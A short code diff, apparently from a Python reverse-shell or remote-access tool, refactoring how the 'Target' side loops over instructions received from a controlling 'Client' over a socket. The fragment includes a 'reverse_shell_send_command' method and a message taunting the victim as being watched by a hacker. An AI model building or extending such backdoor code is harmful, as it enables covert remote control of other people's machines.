@@ -36,7 +36,6 @@ class Client(Machine):
             print("the ip address is invalid")
             print("Error " + str(msg))
 
-
     def reverse_shell_send_command(self):
         try:
             self.s.send(str.encode("shell"))
@@ -129,15 +128,11 @@ class Target(Machine):
     # loop that wait for instruction from client
     def what_to_do(self):
         try:
-            while True:
+            instruction = ""
+            while instruction != "quit":
                 instruction = self.conn.recv(self.buffer)
                 instruction = instruction.decode("utf-8")
-                if instruction == "quit":
-                    if self.print:
-                        print("Leave the programme... Bye")
-                    self.quit()
-                    break
-                elif instruction == "print_target_True":
+                if instruction == "print_target_True":
                     self.print = True
                     print("Hi, your favourite hacker decide to show you what he is doing :) What a great man")
                 elif instruction == "print_target_False":
